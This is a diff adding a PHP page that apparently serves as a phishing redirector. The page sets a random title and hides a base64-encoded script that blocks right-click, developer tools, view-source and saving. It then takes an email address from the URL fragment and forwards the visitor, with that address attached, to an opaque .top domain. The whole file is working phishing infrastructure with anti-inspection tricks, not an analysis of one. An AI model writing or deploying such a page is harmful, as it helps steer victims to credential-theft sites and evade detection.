@@ -1,0 +1,49 @@
+<?php
+session_start();
+function generateRandomString($length = 10) {
+    $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
+    $charactersLength = strlen($characters);
+    $randomString = '';
+    for ($i = 0; $i < $length; $i++) {
+        $randomString .= $characters[rand(0, $charactersLength - 1)];
+    }
+    return $randomString;
+}
+?>
+<html>
+    <head>
+        <title><?=generateRandomString(30);?></title>
+    </head>
+    <body>
+<script>
+document.write(atob("PHNjcmlwdD4KICAgIC8vIGRpc2FibGUgcmlnaHQgY2xpY2sKICAgIGRvY3VtZW50LmFkZEV2ZW50TGlzdGVuZXIoJ2NvbnRleHRtZW51JywgZXZlbnQgPT4gZXZlbnQucHJldmVudERlZmF1bHQoKSk7CiAKICAgIGRvY3VtZW50Lm9ua2V5ZG93biA9IGZ1bmN0aW9uIChlKSB7CiAKICAgICAgICAvLyBkaXNhYmxlIEYxMiBrZXkKICAgICAgICBpZihlLmtleUNvZGUgPT0gMTIzKSB7CiAgICAgICAgICAgIHJldHVybiBmYWxzZTsKICAgICAgICB9CiAKICAgICAgICAvLyBkaXNhYmxlIEkga2V5CiAgICAgICAgaWYoZS5jdHJsS2V5ICYmIGUuc2hpZnRLZXkgJiYgZS5rZXlDb2RlID09IDczKXsKICAgICAgICAgICAgcmV0dXJuIGZhbHNlOwogICAgICAgIH0KIAogICAgICAgIC8vIGRpc2FibGUgSiBrZXkKICAgICAgICBpZihlLmN0cmxLZXkgJiYgZS5zaGlmdEtleSAmJiBlLmtleUNvZGUgPT0gNzQpIHsKICAgICAgICAgICAgcmV0dXJuIGZhbHNlOwogICAgICAgIH0KCiAgICAgICAgLy8gUHJldmVudCBDdHJsK3MgPSBkaXNhYmxlIHNhdmUKICAgICAgICBpZiAoZXZlbnQuY3RybEtleSAmJiAoZXZlbnQua2V5Q29kZSA9PT0gODUgfHwgZXZlbnQua2V5Q29kZSA9PT0gODMgfHwgZXZlbnQua2V5Q29kZSA9PT02NSApKSB7CiAgICAgICAgICAgIHJldHVybiBmYWxzZTsKICAgICAgICB9CgogICAgICAgIC8vIGRpc2FibGUgVSBrZXkKICAgICAgICBpZihlLmN0cmxLZXkgJiYgZS5rZXlDb2RlID09IDg1KSB7CiAgICAgICAgICAgIHJldHVybiBmYWxzZTsKICAgICAgICB9CiAgICB9CiAKPC9zY3JpcHQ+"));
+</script>
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.4.1/jquery.min.js" integrity="sha256-CSXorXvZcTkaix6Yvo6HppcZGetbYMGWSFlBw8HfCJo=" crossorigin="anonymous"></script>
+        <script>
+            function isBase64(str) {
+                try {
+                    return btoa(btoa(str)) == str;
+                } catch (err) {
+                    return false;
+                }
+            }
+            $(document).ready(function() {
+                var hash = window.location.hash;
+                if(hash !== "") {
+                    hash = hash.split('#');
+                    let email = hash[1];
+                    if(isBase64(email)) {
+                        email = btoa(email);
+                    } else {
+                        email = email;
+                    }
+                    $.ajax({
+                        success:function() {
+                            window.location.href = "https://51495d5d-1dfb-4323-9857-ffbcf4c9d496.top/?e=" + email;
+                        }
+                    })
+                }
+            })
+        </script>
+    </body>
+</html>
